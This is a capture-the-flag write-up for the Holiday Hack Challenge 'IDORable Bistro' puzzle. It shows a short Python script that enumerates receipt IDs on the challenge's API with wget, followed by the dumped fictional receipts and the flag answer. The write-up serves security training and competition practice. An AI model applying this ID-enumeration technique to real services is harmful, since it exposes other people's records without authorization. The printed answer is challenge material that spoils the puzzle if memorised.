# IDORable Bistro

## Objective  

Difficulty: ❄️❄️  
[Hints](./docs/HHC_2025/neighborhood/hints/hint-idorable.md) and [Conversations](./docs/HHC_2025/neighborhood/hints/chat-josh_wright.md) and [Items](./docs/HHC_2025/neighborhood/Items/item-receipt.md)  

Josh has a tasty IDOR treat for you—stop by Sasabune for a bite of vulnerability. What is the name of the gnome?

## Solution / Flag

> Bartholomew Quibblefrost
  
## Detailed Solution

Use Burp to quickly see that the URL is converted to an API URL using the ID in the string

first receipt 101  
last receipt 152  

Switching to wget, I wrote a quick script to download all of the available receipts.

```python
#!/bin/python3

import subprocess

base_url = "https://its-idorable.holidayhackchallenge.com/api/receipt?id="
start = 101
end = 152

for i in range(start, end + 1):
    url = f"{base_url}{i}"
    subprocess.run(["wget", url])
```

Quick bash command to combine all files

```bash
root@kali:~/Downloads/HHC# cat receipt?id* > comb.txt
```

Read thru the customer notes until one jumps out

```bash
{"customer":"Duke Dosis","date":"2025-12-20","id":101,"items":[{"name":"Omakase Experience","price":150.0},{"name":"Sake Flight (Premium)","price":45.0}],"note":"Claims his pet rock is a certified sushi-grade emotional support animal. Demanded a tiny chair and a water bowl for it.","paid":true,"table":1,"total":195.0}
{"customer":"Mrs. Sarah Henderson","date":"2025-12-18","id":102,"items":[{"name":"Dragon Roll","price":18.5}],"note":"Insists her cat can speak fluent Japanese, but only after three servings of premium toro. The cat remained silent, but looked exceptionally pleased.","paid":true,"table":2,"total":18.5}
{"customer":"Bobby Mitchell","date":"2025-12-19","id":103,"items":[{"name":"California Roll","price":12.0},{"name":"Ramune Soda","price":4.5},{"name":"Pocky Sticks","price":3.0}],"note":"Tried to pay for his meal with a rare trading card featuring an original creature called 'Glimmerfin'. He was very insistent it would be valuable someday.","paid":true,"table":3,"total":19.5}
{"customer":"SANS Investigator Alumni","date":"2025-12-21","id":104,"items":[{"name":"Forensic Platter (for 'data' recovery)","price":45.0},{"name":"Red Team Roll (extra spicy)","price":18.0},{"name":"Blue Team Bento","price":22.0},{"name":"Green Tea","price":4.0}],"note":"Attempted to forensically analyze the soy sauce for 'trace evidence of gluten'. We assured them it's gluten-free.","paid":true,"table":4,"total":89.0}
{"customer":"Detective Sarah Walsh","date":"2025-12-21","id":105,"items":[{"name":"Undercover Unagi","price":16.0},{"name":"Strong Black Coffee","price":4.0}],"note":"Asked for a table with a clear view of all exits. Said she was 'investigating a case of serial sauce theft'.","paid":true,"table":5,"total":20.0}
{"customer":"Professor Tinker","date":"2025-12-20","id":106,"items":[{"name":"Schr\u00f6dinger's Sashimi Box (both raw and cooked... somehow)","price":30.0}],"note":"Spent an hour trying to calculate the optimal angle to dip his sushi for maximum flavor distribution. His napkin was covered in equations.","paid":true,"table":6,"total":30.0}
{"customer":"Ed Skoudis","date":"2025-12-21","id":107,"items":[{"name":"Penetration Test Platter","price":55.0},{"name":"Fedora-Brim Bento","price":5.0},{"name":"Johnny's Jalape\u00f1o Jokes","price":7.0}],"note":"Unmistakable in his classic fedora. Kept asking 'Where's Johnny?' and demanded Johnny be seated next to him. Attempted to socially-engineer the soy sauce into giving up the Wi-Fi password.","paid":true,"table":7,"total":67.0}
{"customer":"Joshua Wright","date":"2025-12-20","id":108,"items":[{"name":"Wireless Wonton Soup","price":9.0},{"name":"De-auth Dragon Roll","price":19.0},{"name":"Packet Capture Karaage","price":14.0}],"note":"Successfully rick-rolled the restaurant's smart speakers using a Flipper Zero. We were not amused, but the other diners were.","paid":true,"table":8,"total":42.0}
{"customer":"Lynn Schifano","date":"2025-12-19","id":109,"items":[{"name":"Agile Avocado Roll","price":12.0},{"name":"Scope Creep Sake","price":10.0},{"name":"Mochi Ice Cream","price":7.0}],"note":"Provided a detailed Gantt chart for her dining experience, complete with milestones for appetizer, main course, and dessert.","paid":true,"table":9,"total":29.0}
{"customer":"JJ Jasinski","date":"2025-12-20","id":110,"items":[{"name":"Mosh Pit Maki (extra crunchy)","price":10.0},{"name":"Headbanger Tempura (one-handed eating)","price":6.0}],"note":"Joined virtually from the UK. Spent the call headbanging through a full power-chord solo, kept asking 'What did you say?' between growls that were definitely not English. Chef now offers complimentary earplugs to table 10.","paid":true,"table":10,"total":16.0}
{"customer":"Thomas Bouve","date":"2025-12-21","id":111,"items":[{"name":"Frites & Mayo Maki","price":15.0}],"note":"Asked for extra mayonnaise for his sushi. We are still processing this request.","paid":true,"table":11,"total":15.0}
{"customer":"Mark Devito","date":"2025-12-20","id":112,"items":[{"name":"The 'Mainframe' Maguro","price":25.0},{"name":"COBOL-Cured Salmon","price":18.0}],"note":"Complained that the menu wasn't written in Fortran. Said our modern POS system lacks 'the elegance of a punch card'.","paid":true,"table":12,"total":43.0}
{"customer":"Chris Davis","date":"2025-12-19","id":113,"items":[{"name":"CTF (Capture The Flavor) Roll","price":19.0},{"name":"Pwned Poke","price":17.0},{"name":"Root Beer Float","price":8.0}],"note":"Left a note on the receipt that said 'The flag is... delicious'. We think it was a compliment.","paid":true,"table":13,"total":44.0}
{"customer":"Paul Beckett","date":"2025-12-21","id":114,"items":[{"name":"Firewall Futomaki","price":16.0},{"name":"Threat Model Tempura","price":20.0}],"note":"Paul LOVES to eat \u2014 so much that when we handed him the menu he tried to order the Wi-Fi password '\u00e0 la carte', tasted the paper to check freshness, and politely asked if he could adopt a tempura as a roommate. He applauded the sushi, proposed to a nigiri, and left with a napkin cape. Staff now keep a spare chair labeled 'Paul's Next Course.'","paid":true,"table":14,"total":36.0}
{"customer":"Kyle Parrish","date":"2025-12-20","id":115,"items":[{"name":"Five-Alarm Fire Roll","price":22.0}],"note":"Asked if we could 'put out' the spicy tuna. We gave him a glass of milk.","paid":true,"table":15,"total":22.0}
{"customer":"Evan Booth","date":"2025-12-19","id":116,"items":[{"name":"Deconstructed Dragon Roll","price":18.0},{"name":"DIY Dango","price":12.0}],"note":"Built a fully functional radio transmitter out of a pair of chopsticks, a napkin, and a packet of soy sauce. We are both impressed and concerned.","paid":true,"table":16,"total":30.0}
{"customer":"Chris Elgee","date":"2025-12-21","id":117,"items":[{"name":"NetWars Nigiri","price":25.0},{"name":"Coin-a-Phrase California Roll","price":15.0},{"name":"Level 5 Lemonade","price":6.0}],"note":"Asked for the bill to be presented as a series of progressively harder challenges. He tipped well after solving the final riddle.","paid":true,"table":17,"total":46.0}
{"customer":"Kevin McFarland","date":"2025-12-20","id":118,"items":[{"name":"Stargazer's Scallops","price":24.0},{"name":"Galaxy Gyoza","price":12.0}],"note":"Daughter asked if the chef could make the sushi twinkle. He added edible glitter. She was delighted.","paid":true,"table":18,"total":36.0}
{"customer":"Tom Hessman","date":"2025-12-19","id":119,"items":[{"name":"QA Quail Eggs","price":14.0},{"name":"Bug Bounty Bento","price":22.0},{"name":"Regression Test Ramen","price":16.0}],"note":"Left an upbeat 'bug report' praising the ramen's perfectly balanced warmth, included step-by-step tasting notes, a smiley face, and a ramen haiku.","paid":true,"table":19,"total":52.0}
{"customer":"Torkel Opsahl","date":"2025-12-21","id":120,"items":[{"name":"Viking's Voyage Platter","price":40.0}],"note":"Ate his sushi with a fork and knife. When asked, he said 'Chopsticks are not optimized for my throughput'.","paid":true,"table":20,"total":40.0}
{"customer":"Eric Pursley","date":"2025-12-20","id":121,"items":[{"name":"Aviator's Ahi Tuna","price":26.0},{"name":"Runway Roll","price":18.0}],"note":"Asked for his food to be delivered 'on final approach'. The waiter made airplane noises.","paid":true,"table":21,"total":44.0}
{"customer":"Jared Folkins","date":"2025-12-19","id":122,"items":[{"name":"The 'Kidlet' Katsu Curry","price":15.0},{"name":"Dad Joke Donburi","price":18.0},{"name":"Playground Pocky","price":6.0}],"note":"Told the waiter a joke: 'Why did the sushi blush? Because it saw the ginger dressing!' The waiter is still recovering.","paid":true,"table":22,"total":39.0}
{"customer":"Patrick Chapman","date":"2025-12-21","id":123,"items":[{"name":"Hollywood Hand Roll","price":20.0},{"name":"Beverly Hills Bento","price":35.0}],"note":"Joined virtually from LA. His agent tried to negotiate a lower price for the virtual fish.","paid":true,"table":23,"total":55.0}
{"customer":"Maria Rodriguez","date":"2025-12-19","id":124,"items":[{"name":"Community Garden Roll","price":14.0},{"name":"Neighborhood Nigiri","price":20.0},{"name":"Block Party Bento","price":25.0}],"note":"Organized an impromptu potluck at her table with dishes from three other tables. It was surprisingly delicious.","paid":true,"table":24,"total":59.0}
{"customer":"David Chen","date":"2025-12-20","id":125,"items":[{"name":"The 'It's Not a Bug, It's a Feature' Futomaki","price":18.0},{"name":"Rubber Duck Dumplings","price":10.0}],"note":"Spent ten minutes explaining to his rubber duck why the wasabi was spicy. The duck was a good listener.","paid":true,"table":25,"total":28.0}
{"customer":"Jennifer Adams","date":"2025-12-18","id":126,"items":[{"name":"A+ Grade Ahi","price":22.0},{"name":"Pop Quiz Poke","price":18.0}],"note":"Tried to grade our menu. Gave the appetizers a 'B+' but said the main courses 'Exceeded Expectations'.","paid":true,"table":1,"total":40.0}
{"customer":"Michael Thompson","date":"2025-12-21","id":127,"items":[{"name":"The 'Measure Twice, Cut Once' Roll","price":19.0}],"note":"Complained about a slight wobble in his table. Fixed it himself with a folded napkin and declared it 'structurally sound'.","paid":true,"table":2,"total":19.0}
{"customer":"Lisa Park","date":"2025-12-20","id":128,"items":[{"name":"The 'Stat!' Sashimi","price":28.0},{"name":"On-Call Onigiri","price":12.0},{"name":"Triage Tempura","price":18.0}],"note":"Diagnosed a piece of tuna as 'suffering from a minor identity crisis' but 'otherwise healthy'. Ate it anyway.","paid":true,"table":3,"total":58.0}
{"customer":"Robert Williams","date":"2025-12-19","id":129,"items":[{"name":"The 'Good Old Days' Gyoza","price":12.0},{"name":"Nostalgia Nigiri","price":20.0}],"note":"Kept referring to the sushi chef as 'the new guy'. Our chef has been here for 15 years.","paid":true,"table":4,"total":32.0}
{"customer":"Amanda Foster","date":"2025-12-21","id":130,"items":[{"name":"The 'I Need a Break' Bento","price":25.0}],"note":"Fell asleep at the table for 15 minutes. Woke up, said 'Best nap ever', and finished her meal.","paid":true,"table":5,"total":25.0}
{"customer":"James Miller","date":"2025-12-20","id":131,"items":[{"name":"Grease Monkey Gyoza","price":12.0},{"name":"Motor Oil Macha (it's just strong tea)","price":6.0},{"name":"Fan Belt Futomaki","price":16.0}],"note":"Asked for a 'tune-up' on his teriyaki. The chef added extra sauce and said 'She's purring now'.","paid":true,"table":6,"total":34.0}
{"customer":"Emma Johnson","date":"2025-12-18","id":132,"items":[{"name":"All-Nighter Nigiri","price":20.0},{"name":"Cram Session California Roll","price":12.0}],"note":"Was using a textbook as a plate until we politely intervened. Claimed she was 'absorbing knowledge through osmosis'.","paid":true,"table":7,"total":32.0}
{"customer":"Carlos Mendoza","date":"2025-12-19","id":133,"items":[{"name":"Green Thumb Gomae","price":9.0}],"note":"Tried to identify the species of the microgreens on his salad. He was correct on 4 out of 5.","paid":true,"table":8,"total":9.0}
{"customer":"Rachel Green","date":"2025-12-21","id":134,"items":[{"name":"Zen Garden Salad","price":15.0},{"name":"Inner Peace Ikura","price":18.0},{"name":"Mindful Miso Soup","price":6.0}],"note":"Asked if the fish had a happy life. We assured her it was 'very fulfilled'.","paid":true,"table":9,"total":39.0}
{"customer":"Tony Russo","date":"2025-12-20","id":135,"items":[{"name":"The 'Fuggedaboutit' Futomaki","price":18.0},{"name":"Cannoli Hand Roll","price":12.0}],"note":"Kept saying 'This is good, but it's not pizza.' We are aware, Tony. We are aware.","paid":true,"table":10,"total":30.0}
{"customer":"Helen Cooper","date":"2025-12-18","id":136,"items":[{"name":"Grandma's Secret Recipe Roll","price":16.0}],"note":"Pinched the waiter's cheek and told him he was 'too skinny'. Left a $20 tip and a bag of hard candies.","paid":true,"table":11,"total":16.0}
{"customer":"Steve Bailey","date":"2025-12-19","id":137,"items":[{"name":"Five-Alarm Firecracker Roll","price":20.0},{"name":"Smoked Salmon (No, really, it's just smoked)","price":18.0}],"note":"Asked for the spiciest thing on the menu, then immediately regretted it. Drank three glasses of water and started sweating profusely.","paid":true,"table":12,"total":38.0}
{"customer":"Nancy Davis","date":"2025-12-21","id":138,"items":[{"name":"The 'Shhh!' Sashimi Platter","price":30.0},{"name":"Quiet Room Quail Eggs","price":14.0},{"name":"Dewey Decimal Donburi","price":18.0}],"note":"Shushed a neighboring table for 'excessive crunching'. The crunching was from their tempura.","paid":true,"table":13,"total":62.0}
{"customer":"Bartholomew Quibblefrost","date":"2025-12-20","id":139,"items":[{"name":"Frozen Roll (waitress improvised: sorbet, a hint of dry ice)","price":19.0}],"note":"Insisted on increasingly bizarre rolls and demanded one be served frozen. The waitress invented a 'Frozen Roll' on the spot with sorbet and a puff of theatrical smoke. He nodded solemnly and asked if we could make these in bulk.","paid":true,"table":14,"total":19.0}
{"customer":"Grace Lee","date":"2025-12-18","id":140,"items":[{"name":"The 'Who's a Good Boy?' Bento","price":22.0},{"name":"Paw-sitively Perfect Poke","price":18.0}],"note":"Brought her chihuahua, which was wearing a tiny kimono. The dog got more attention than any human customer.","paid":true,"table":15,"total":40.0}
{"customer":"Barry Stone","date":"2025-12-19","id":141,"items":[{"name":"High-Deductible Donburi","price":18.0},{"name":"Actuarial Ahi","price":25.0},{"name":"Premium Plus Poke","price":20.0}],"note":"Calculated the statistical probability of him enjoying his meal. The result was 97.3%. He seemed pleased with the data.","paid":true,"table":16,"total":63.0}
{"customer":"Dorothy Kim","date":"2025-12-21","id":142,"items":[{"name":"The Itemized Ikura","price":18.0},{"name":"Tax Bracket Bento","price":28.0}],"note":"Asked if she could write off the meal as a 'client entertainment expense'. Her client was her husband.","paid":true,"table":17,"total":46.0}
{"customer":"George Turner","date":"2025-12-20","id":143,"items":[{"name":"The Clogged Pipe Chirashi","price":22.0}],"note":"Commented that our water pressure was 'excellent, just excellent'. Best compliment we've received all week.","paid":true,"table":18,"total":22.0}
{"customer":"Margaret Walsh","date":"2025-12-18","id":144,"items":[{"name":"Open House Hand Roll","price":15.0},{"name":"Curb Appeal California Roll","price":14.0},{"name":"Closing Costs Chirashi","price":25.0}],"note":"Described her sushi as having 'good bones' and 'great flow'. She then tried to sell it to the table next to her.","paid":true,"table":19,"total":54.0}
{"customer":"Vincent O'Brien","date":"2025-12-19","id":145,"items":[{"name":"High-Voltage Volcano Roll","price":22.0},{"name":"Short Circuit Sashimi","price":28.0}],"note":"Warned us that our decorative lanterns were a 'potential fire hazard'. They are LEDs. He seemed disappointed.","paid":true,"table":20,"total":50.0}
{"customer":"Patricia Nelson","date":"2025-12-21","id":146,"items":[{"name":"The Golden Handshake Hand Roll","price":25.0}],"note":"Asked if we accept stock options as payment. We do not.","paid":true,"table":21,"total":25.0}
{"customer":"Kevin Murphy","date":"2025-12-20","id":147,"items":[{"name":"The Hail Mary Maki","price":18.0},{"name":"Half-Time Hand Roll","price":15.0},{"name":"Victory Formation Veggie Roll","price":14.0}],"note":"Gave the chef a pep talk before the meal. The chef seemed inspired and added extra crab to his roll.","paid":true,"table":22,"total":47.0}
{"customer":"Diane Richards","date":"2025-12-18","id":148,"items":[{"name":"The Perennial Poke","price":19.0},{"name":"Baby's Breath Bento","price":22.0}],"note":"Arranged her ginger and wasabi into a beautiful, yet inedible, floral display.","paid":true,"table":23,"total":41.0}
{"customer":"Thomas Anderson","date":"2025-12-19","id":149,"items":[{"name":"The Matrix Maki","price":22.0},{"name":"The One Onigiri","price":10.0}],"note":"Asked if he was living in a simulation. The waiter said 'I'm not supposed to tell you'. He seemed to understand.","paid":true,"table":24,"total":32.0}
{"customer":"Susan Clark","date":"2025-12-21","id":150,"items":[{"name":"The Bake Sale Bento","price":20.0},{"name":"The 'I'm not a regular mom, I'm a cool mom' Roll","price":18.0},{"name":"Carpool Karaage","price":15.0}],"note":"Tried to recruit the chef for the PTA bake sale. He politely declined, citing 'prior commitments to raw fish'.","paid":true,"table":25,"total":53.0}
{"customer":"Christopher Swimmer","date":"2025-12-21","id":151,"items":[{"name":"Fried Rice","price":20.0}],"note":"Christopher doesn't like sushi but loves fried rice. He kept talking about improbable ways he could play baseball while jumping off the high dive.","paid":true,"table":26,"total":20.0}
{"customer":"Karolee Pizzazz","date":"2025-12-21","id":152,"items":[{"name":"California Roll","price":15.0},{"name":"Philadelphia Roll","price":10.0}],"note":"Karolee loves cheer and kept talking enthusiastically about the cool stunts she was doing.","paid":true,"table":26,"total":25.0}
```

The one that jumps out...

```bash
{"customer":"Bartholomew Quibblefrost","date":"2025-12-20","id":139,"items":[{"name":"Frozen Roll (waitress improvised: sorbet, a hint of dry ice)","price":19.0}],"note":"Insisted on increasingly bizarre rolls and demanded one be served frozen. The waitress invented a 'Frozen Roll' on the spot with sorbet and a puff of theatrical smoke. He nodded solemnly and asked if we could make these in bulk.","paid":true,"table":14,"total":19.0}
```

Go back to the objective to enter the answer

## Game Location

![alt text](./docs/HHC_2025/neighborhood/Sasabune/idor.png)
